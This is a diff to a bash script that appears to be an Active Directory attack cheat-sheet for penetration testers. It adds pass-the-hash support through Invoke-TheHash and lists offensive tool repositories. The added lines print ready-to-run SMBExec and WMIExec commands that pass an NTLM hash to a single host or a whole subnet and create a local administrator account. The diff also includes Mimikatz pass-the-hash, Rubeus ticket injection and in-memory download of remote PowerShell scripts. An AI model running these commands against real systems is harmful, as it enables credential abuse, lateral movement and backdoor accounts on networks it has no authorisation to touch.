@@ -6,20 +6,21 @@
 ################################################################################
 
 
-LocalIP="[Local-IP]";		#
-LocalPort="[Local-Port]";		#
-Username="''";			#
-NQUsername="";			#
-Password="''";			#
-Domain="''";			#
-NQDomain="";			#
-IP="'[IP]'";			#
-NQIP="";			#
-LDAP="";			#
-DC="";				#
-NS="<IP>";			#
-Version="v2.1"			#
-MainCheck="1"			#
+LocalIP="[Local-IP]";		
+LocalPort="[Local-Port]";		
+Username="'[Username]'";			
+NQUsername="[Username]";			
+Password="''";			
+Domain="'[Domain]'";			
+NQDomain="[Domain]";			
+IP="'[IP]'";			
+NQIP="[IP]";	
+NTLMHash="'[NTLM-Hash]'";	
+LDAP="";			
+DC="";				
+NS="<IP>";			
+Version="v2.1"			
+MainCheck="1"			
 
 ################################################################################
 # Future Repo's for external                                                   #
@@ -81,6 +82,7 @@ GetSystemTechniquesRepo="https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-Sy
 Group3rRepo="https://github.com/Group3r/Group3r/releases/download/1.0.41/Group3r.exe";
 InveighRepo="https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/";
 InvokeNoPacRepo="https://github.com/ricardojba/Invoke-noPac/blob/main/Invoke-noPac.ps1"
+InvokeTheHashRepo="https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/";
 JAWSRepo="https://raw.githubusercontent.com/411Hall/JAWS/master/";
 LazagneRepo="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe";
 NishangRepo="https://raw.githubusercontent.com/samratashok/nishang/master/";
@@ -114,7 +116,7 @@ DomainPasswordSprayLocalRepo="$HOME/ADAT/DomainPasswordSpray"
 EmpireLocalRepo="$HOME/ADAT/Empire"
 GetSystemTechniquesLocalRepo="$HOME/ADAT/Get-System-Techniques"
 InveighLocalRepo="$HOME/ADAT/Inveigh"
-InvokeTheHashRepo="$HOME/ADAT/Invoke-TheHash"
+InvokeTheHashLocalRepo="$HOME/ADAT/Invoke-TheHash"
 InvokeNoPacLocalRepo="$HOME/ADAT/Invoke-NoPac"
 JAWSLocalRepo="$HOME/ADAT/JAWS"
 NishangLocalRepo="$HOME/ADAT/nishang"
@@ -308,11 +310,11 @@ else
 	echo -e ""
 fi
 
-if [ -d "$InvokeTheHashRepo" ]
+if [ -d "$InvokeTheHashLocalRepo" ]
 then
 	echo -e ""
     	echo -e "Invoke-TheHash is installed, checking if updated to latest version."
-    	cd $InvokeTheHashRepo
+    	cd $InvokeTheHashLocalRepo
     	git pull "https://github.com/Kevin-Robertson/Invoke-TheHash.git"
  	echo -e ""
 else
@@ -534,12 +536,35 @@ echo -e "${YELLOW}Spawn PowerShell Process with supplied user's NTLM hash${RESTO
 echo -e "Invoke-Mimikatz -Command '"\"sekurlsa::pth /user:[User] /domain:[Domain] /ntlm:[NTLM] /run:powershell.exe"\"'"
 echo -e ""
 echo -e ""
-echo -e "${IBLUE}Invoke-SMBExec${RESTORE}"  
+echo -e "${IBLUE}Invoke-TheHash${RESTORE}"  
 echo -e ""
-echo -e "${YELLOW}Load Invoke-SMBExec into memory${RESTORE}"
-echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SMBExec.ps1);Invoke-SMBExec"
+echo -e "${YELLOW}Load all scripts into memory${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SMBExec.ps1)"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-WMIExec.ps1)"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-TheHash.ps1)"
 echo -e ""
-
+echo -e "${YELLOW}Check SMB signing${RESTORE}"
+echo -e "Invoke-TheHash -Type SMBExec -Target $IP"
+echo -e "Invoke-TheHash -Type SMBExec -Target [CIDR]"
+echo -e ""
+echo -e "${YELLOW}Check for command execution (SMB)${RESTORE}"
+echo -e "Invoke-TheHash -Type SMBExec -Username $Username -Hash $NTLMHash -Target $IP"
+echo -e "Invoke-TheHash -Type SMBExec -Username $Username -Hash $NTLMHash -Target [CIDR]"
+echo -e ""
+echo -e "${YELLOW}Pass hash to target and execute specified command (SMB) ${RESTORE}"
+echo -e "Invoke-TheHash -Type SMBExec -Command "\"net user /add Pentest Password123 \&\& netlocal group 'Administrators' /add Pentest"\" -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target $IP "
+echo -e "Invoke-TheHash -Type SMBExec -Command "\"net user /add Pentest Password123 \&\& netlocal group 'Administrators' /add Pentest"\" -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target [CIDR]"
+echo -e ""
+echo -e ""
+echo -e "${YELLOW}Check for command execution (WMI)${RESTORE}"
+echo -e "Invoke-TheHash -Type WMIExec -Username $Username -Hash $NTLMHash -Target $IP"
+echo -e "Invoke-TheHash -Type WMIExec -Username $Username -Hash $NTLMHash -Target [CIDR]"
+echo -e ""
+echo -e "${YELLOW}Pass hash to target and execute specified command (WMI) ${RESTORE}"
+echo -e "Invoke-TheHash -Type WMIExec -Command "\"net user /add Pentest Password123 \&\& netlocal group 'Administrators' /add Pentest"\" -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target $IP"
+echo -e "Invoke-TheHash -Type WMIExec -Command "\"net user /add Pentest Password123 \&\& netlocal group 'Administrators' /add Pentest"\" -Username $NQUsername@$NQDomain -Hash $NTLMHash -Target [CIDR]"
+echo -e ""
+echo -e ""
 echo -e ""
 
 echo -ne  "Return to Previous Menu?
@@ -596,6 +621,7 @@ echo -e "Invoke-Rubeus -Command "\"monitor /interval:5 /nowrap"\""
 echo -e ""
 echo -e "${YELLOW}Inject ticket (base64 blob)${RESTORE}"
 echo -e "Invoke-Rubeus -Command "\"ptt /ticket:[Base64Blob]"\""
+echo -e ""
 echo -e ""
 echo -e ""
 
@@ -656,6 +682,9 @@ echo -e "Invoke-Rubeus -Command "\"asktgt /user:administrator /certificate:cert.
 echo -e ""
 echo -e "${LBLUE}#8: Load the Base64 encoded ticket into current PowerShell session${RESTORE}"
 echo -e "Invoke-Rubeus -Command "\"ptt /ticket:doIF9jCCBfKgA..[Snip]"\""
+echo -e ""
+echo -e ""
+echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
